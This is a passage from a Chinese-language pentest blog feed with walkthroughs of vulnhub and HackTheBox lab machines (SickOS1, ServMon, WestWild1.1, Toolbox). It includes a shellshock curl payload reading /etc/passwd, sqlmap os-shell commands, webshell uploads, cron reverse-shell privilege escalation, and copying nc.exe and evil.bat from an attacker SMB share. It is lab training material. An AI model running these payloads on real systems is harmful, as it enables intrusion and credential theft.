href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>发现文件上传点，传个马</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216110448.png"></p><blockquote><p>成功上传，但是不知道路径<br>给plot参数随便赋值，最后一项选no such….</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216120020.png"></p><blockquote><p>出现navigator选项，点击即可报错出路径：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216111502.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216111557.png"></p><blockquote><p>根据报错成功拿到路径，达成rce</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216111832.png"></p><blockquote><p>拿到立足点</p></blockquote><h3 id="另解-公开漏洞利用"><a href="#另解-公开漏洞利用" class="headerlink" title="另解-公开漏洞利用"></a>另解-公开漏洞利用</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216111932.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216111942.png"></p><blockquote><p>plot参数处存在命令注入，payload：<code>;&lt;cmd&gt;</code>，回显在<code>select host</code>处</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216112156.png"></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>linEnum枚举：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216112846.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216112932.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216113033.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216113117.png"></p><blockquote><p>发现大概率可利用自动任务</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216113253.png"></p><blockquote><p>虽然finally无权修改，但是finally执行的write可以修改，修改为反弹shell：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216114132.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216114536.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>端口扫描：只开放80的web服务</li><li>web渗透：使用报错信息找到文件上传路径，传马getshell拿到www-data的立足点；另解，使用公开漏洞进行命令注入达成rce</li><li>提权：枚举出root名下的5分钟一次的计划任务，且其最终执行的脚本文件可写，写入反弹语句，拿到root shell</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub SickOS1</title>
    <link href="/blog/vulnhub/vulnhub%20SickOS1/"/>
    <url>/blog/vulnhub/vulnhub%20SickOS1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195707.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195715.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195731.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195740.png" alt="image.png"></p><blockquote><p>开启了squid-http代理、ssh，关闭了8080</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><h3 id="穿越squid代理"><a href="#穿越squid代理" class="headerlink" title="穿越squid代理"></a>穿越squid代理</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195749.png" alt="image.png"></p><blockquote><p>web服务并未直接对外开放，添加3128端口为代理，使其转发流量从而访问web服务</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195755.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195804.png" alt="image.png"></p><blockquote><p>目录爆破</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb 10.10.10.139 -p 10.10.10.139:3128<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195812.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195829.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195836.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195856.png" alt="image.png"></p><h3 id="Wolf-CMS"><a href="#Wolf-CMS" class="headerlink" title="Wolf CMS"></a>Wolf CMS</h3><blockquote><p>虽然从源码没有找到版本号，但还是先走公开漏洞利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195907.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195915.png" alt="image.png"></p><blockquote><p>先试试这个能否利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195923.png" alt="image.png"></p><blockquote><p>重定向到了登录页面，尝试了几个弱密码，登录成功</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195932.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195941.png" alt="image.png"></p><blockquote><p>上传反弹shell，拿到立足点</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195949.png" alt="image.png"></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195959.png" alt="image.png"></p><blockquote><p>内核版本很低，还有gcc，尝试内核提权，跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200012.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200023.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200030.png" alt="image.png"></p><blockquote><p>判断脏牛为误报</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200038.png" alt="image.png"></p><blockquote><p>linpeas的建议均排除，直接搜索：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200047.png" alt="image.png"></p><blockquote><p>41995、43345、45553均失败，暂时放下内核提权</p></blockquote><blockquote><p>linEnum枚举：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200055.png" alt="image.png"></p><blockquote><p>发现一个特权很高的admin用户sickos</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200102.png" alt="image.png"></p><blockquote><p>发现很感兴趣的定时任务，出现了很多次，且是root名下</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200112.png" alt="image.png"></p><blockquote><p>有root的计划任务进程在执行</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200120.png" alt="image.png"></p><blockquote><p>有数据库开放</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200133.png" alt="image.png"></p><blockquote><p>计划任务没什么收获，找mysql配置文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200140.png" alt="image.png"></p><blockquote><p>开源信息表示存在config.php保存各凭据</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200147.png" alt="image.png"></p><blockquote><p>登录数据库查：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200206.png" alt="image.png"></p><blockquote><p>只有一个最初登录网站时的admin@admin凭据<br>尝试拿数据库密码和admin登录其他账户：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200214.png" alt="image.png"></p><blockquote><p>以数据库密码登录到了sickos用户</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200233.png" alt="image.png"></p><blockquote><p>sudo ALL提权至root</p></blockquote><h2 id="0x04-另解：shellshock漏洞"><a href="#0x04-另解：shellshock漏洞" class="headerlink" title="0x04 另解：shellshock漏洞"></a>0x04 另解：shellshock漏洞</h2><blockquote><p>shellshock：bash的漏洞，攻击者可以使用特定环境变量使用类似注入的方法达成rce<br>参考：<a href="https://www.freebuf.com/vuls/266218.html">freebuf</a>、<a href="https://fdlucifer.github.io/2020/04/02/shellshock-exploitation/">github</a></p></blockquote><blockquote><p>原理：Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题的是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行未退出，而是继续解析并执行shell命令，而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p></blockquote><blockquote><p>条件：bash版本&lt;4.3</p></blockquote><blockquote><p>payload：<code>() &#123; :; &#125;; echo; /bin/cat /etc/passwd</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200241.png" alt="image.png"></p><blockquote><p>nikto扫描发现存在针对<code>cgi-bin/status</code>的shellshock漏洞<br>漏洞利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200252.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x 10.10.10.139:3128 http://10.10.10.139/cgi-bin/status -H <span class="hljs-string">&quot;test: () &#123; :; &#125;;echo;/bin/cat /etc/passwd&quot;</span> -v<br></code></pre></td></tr></table></figure><blockquote><p>-x：指定代理服务器，本机需要<br>-H：修改请求头，添加了test参数<br>-v：显示完整数据包<br>由于本机需要代理，故未用bp，下图为使用bp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402200312.png" alt="image.png"></p><h2 id="0x05-靶机总结"><a href="#0x05-靶机总结" class="headerlink" title="0x05 靶机总结"></a>0x05 靶机总结</h2><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><ol><li>端口扫描：开放ssh、http代理squid</li><li>web渗透：不能直接访问到web服务，需通过squid端口代理；目录爆破得到cms页面，按照公开漏洞，弱密码admin@admin登录后台，传马，拿到立足点</li><li>提权：从配置文件拿到mysql凭据，密码喷洒成功登录高权限用户sickos的ssh，sudo ALL提权</li></ol><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><ol><li>漏洞扫描：nikto扫到了apache cgi的shellshock漏洞</li><li>shellshock利用：构造漏洞payload达成rce，获得www-data的立足点</li><li>提权：同预期</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB ServMon</title>
    <link href="/blog/HTB/HTB%20ServMon/"/>
    <url>/blog/HTB/HTB%20ServMon/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819174724.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819175245.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819175850.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819175936.png"></p><blockquote><p>关注点优先在21可匿名访问的ftp、445的smb、80的http和8443的https，最后是22ssh</p></blockquote><h2 id="0x02-ftp"><a href="#0x02-ftp" class="headerlink" title="0x02 ftp"></a>0x02 ftp</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819180418.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -r ftp://anonymous:@10.129.227.77<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819180802.png"></p><blockquote><p>Nathan的密码在他的桌面上</p></blockquote><h2 id="0x03-smb"><a href="#0x03-smb" class="headerlink" title="0x03 smb"></a>0x03 smb</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819180951.png"></p><h2 id="0x04-web"><a href="#0x04-web" class="headerlink" title="0x04 web"></a>0x04 web</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819181315.png"></p><blockquote><p>80看起来是一个sso，搜索后得知是视频监控管理系统，寻找公开漏洞</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819181617.png"></p><blockquote><p>目录穿越，猜测直接读前面说的桌面凭据</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819181756.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819182109.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819182157.png"></p><blockquote><p>先拿密码对smb喷洒</p></blockquote><h2 id="0x05-smb"><a href="#0x05-smb" class="headerlink" title="0x05 smb"></a>0x05 smb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxc smb 10.129.227.77 -u user.txt -p pass.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819182755.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">ServMon</span>\<span class="hljs-title class_">Nadine</span><span class="hljs-symbol">:L1k3B1gBut7s</span><span class="hljs-variable">@W</span>0rk<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819183649.png"></p><blockquote><p>没有收获，转向ssh</p></blockquote><h2 id="0x06-ssh"><a href="#0x06-ssh" class="headerlink" title="0x06 ssh"></a>0x06 ssh</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819183820.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell -c &quot;gci -r -file c:\users -ErrorAction SilentlyContinue&quot;<br>powershell -c &quot;gc C:\users\Nadine\Desktop\user.txt&quot;<br></code></pre></td></tr></table></figure><h2 id="0x07-提权"><a href="#0x07-提权" class="headerlink" title="0x07 提权"></a>0x07 提权</h2><blockquote><p>还有8443的web没看</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819184722.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819184835.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819184934.png"></p><blockquote><p>查看利用，两个都是在说认证后可提权到system</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819185251.png"></p><blockquote><p>根据利用查看配置文件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819185423.png"></p><blockquote><p>密码是<code>ew2x6SsGTxjRwXOT</code>，只能从127访问，正好有ssh做一次端口转发</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh nadine@10.129.227.77 -L 8443:127.0.0.1:8443<br></code></pre></td></tr></table></figure><blockquote><p>半天没找到登录，看了wp发现火狐加载有问题，要用谷歌，所以把流量转发到0.0.0.0，在宿主机看</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -g nadine@10.129.211.198 -L 0.0.0.0:8443:127.0.0.1:8443<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819190359.png"></p><blockquote><p>成功登录，按照利用，先确认目标模块开启：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819190905.png"></p><blockquote><p>把nc和evil.bat准备好</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819191424.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span>\share /user:fyhypo fyhypo<br><span class="hljs-built_in">copy</span> \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span>\share\nc.exe .\nc.exe<br><span class="hljs-built_in">copy</span> \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span>\share\evil.bat .\evil.bat<br></code></pre></td></tr></table></figure><blockquote><p>按照利用先添加脚本<br>Settings &gt; external scripts &gt; scripts &gt; +Add new</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819192035.png"></p><blockquote><p>现在已经添加了脚本，接着添加执行该脚本的任务<br>scheduler &gt; schedules &gt; +Add new</p></blockquote><blockquote><p>按照利用，这次需要配置两组值：interval&#x3D;10s、command&#x3D;fyhypo</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819192709.png"></p><blockquote><p>然后重启<br>Control –&gt; Reload</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819204023.png"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub WestWild1.1</title>
    <link href="/blog/vulnhub/vulnhub%20WestWild1.1/"/>
    <url>/blog/vulnhub/vulnhub%20WestWild1.1/</url>
    
    <content type="html"><![CDATA[<p>vulhub WestWild1.1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195209.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195221.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195230.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195239.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195247.png" alt="image.png"></p><blockquote><p>开启smb、web、ssh</p></blockquote><h2 id="0x02-smb渗透"><a href="#0x02-smb渗透" class="headerlink" title="0x02 smb渗透"></a>0x02 smb渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195304.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195315.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195323.png" alt="image.png"></p><blockquote><p>Aveng说自己忘记密码了，让Wave替他重置，有点懵，先web看看：</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195343.png" alt="image.png"></p><blockquote><p>没有别的信息，只说跟着Wave走</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195358.png" alt="image.png"></p><blockquote><p>目录爆破也没什么信息<br>想起来刚刚有关flag是base64的，查看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195559.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195611.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>初步跑了linEnum没有结果，跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195622.png" alt="image.png"></p><blockquote><p>发现一个可疑脚本，且有写权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195633.png" alt="image.png"></p><blockquote><p>得到新凭据</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402195643.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol><li>端口扫描：开启smb、web、ssh</li><li>smb渗透：空密码登录拿到第一个用户凭据，ssh登录拿到立足点</li><li>提权：发现低权限用户名下有可写执行脚本，执行拿到第二个凭据，提权到高权限用户；新用户为 sudo ALL，直接提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Toolbox</title>
    <link href="/blog/HTB/HTB%20Toolbox/"/>
    <url>/blog/HTB/HTB%20Toolbox/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816114235.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816114326.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816114731.png"></p><blockquote><p>443web、21ftp匿名访问、22ssh(win7)<br>443证书暴露了域信息：admin.megalogistic.com</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.96.171 admin.megalogistic.com&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816115123.png"></p><h2 id="0x02-ftp"><a href="#0x02-ftp" class="headerlink" title="0x02 ftp"></a>0x02 ftp</h2><blockquote><p>匿名登录后只有一个<code>docker-toolbox.exe</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816115554.png"></p><blockquote><p>对该exe的研究暂时延后</p></blockquote><h2 id="0x03-smb"><a href="#0x03-smb" class="headerlink" title="0x03 smb"></a>0x03 smb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -N -L //10.129.96.171<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816115743.png"></p><h2 id="0x04-web"><a href="#0x04-web" class="headerlink" title="0x04 web"></a>0x04 web</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816115421.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816120417.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#强制https</span><br>sqlmap -r sql.txt --force-ssl<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816120708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816121117.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816121130.png"></p><blockquote><p>admin@iamzeadmin</p></blockquote><p>本身也能万能密码进后台，所以用处不大，尝试写马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql.txt --force-ssl --os-cmd <span class="hljs-built_in">id</span> --flush-session --batch<br></code></pre></td></tr></table></figure><blockquote><p>写马过程最好交给–batch，自己一个没选对就要报错：<code>unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported </code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816122451.png"></p><blockquote><p>可以通，且判断为linux，显然是在docker中，换os-shell反弹shell</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql.txt --force-ssl --os-shell --batch<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816122800.png"></p><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <br><span class="hljs-built_in">export</span> TERM=xterm-color<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816124322.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816141235.png"></p><blockquote><p>经典的docker ip，宿主机大概率就是172.17.0.2，传fscan探测：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 172.17.0.1 -o 1.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816142100.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816154146.png"></p><blockquote><p>web页面和入口点的一样，唯一突破点在ssh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816155751.png"></p><blockquote><p>似乎存在默认凭据，去官网查看</p></blockquote><p><img 